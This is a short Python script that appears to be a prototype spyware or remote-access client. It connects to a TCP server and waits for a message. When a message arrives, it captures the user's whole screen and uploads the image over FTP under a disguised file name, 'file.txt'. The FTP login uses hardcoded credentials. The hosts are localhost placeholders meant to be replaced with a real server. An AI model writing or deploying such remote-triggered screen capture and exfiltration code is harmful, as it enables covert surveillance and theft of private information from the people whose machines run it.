from PIL import ImageGrab
from ftplib import FTP
import socket

def self_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    screenshot.close()


def upload_file():
    # Connect to the FTP server
    ftp = FTP()
    ftp.connect('127.0.0.1', 21)  # Replace with your server's IP and port if needed
    ftp.login('dori', 'avmybaby')  # Login with the username and password you set

    # Path to the file you want to upload
    local_file = 'screenshot.png'  # Change this to the path of your file
    remote_file = 'file.txt'  # Remote file name on the server

    # Open the local file and upload it
    with open(local_file, 'rb') as f:
        ftp.storbinary(f"STOR {remote_file}", f)

    print(f"File '{local_file}' uploaded successfully.")

    # Close the FTP connection
    ftp.quit()


def main_tcp_process():
    host = '127.0.0.1'  # Server's IP address (localhost in this case)
    port = 12345  # Port to connect to the server

    # Create a TCP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        client_socket.connect((host, port))
        print(f"Connected to server {host}:{port}")

        print("Waiting for a message from the server...")
        # Wait to receive a message from the server
        message = client_socket.recv(1024)  # Buffer size of 1024 bytes
        if message:
            print(f"Received: {message.decode('utf-8')}")
            self_screenshot()  # Takes a screenshot
            upload_file()  # Uploads the screenshot to the ftp server

    except ConnectionError as e:
        print(f"Connection error: {e}")

    finally:
        # Close the connection
        client_socket.close()
        print("Connection closed")

    print("Done successfully.")
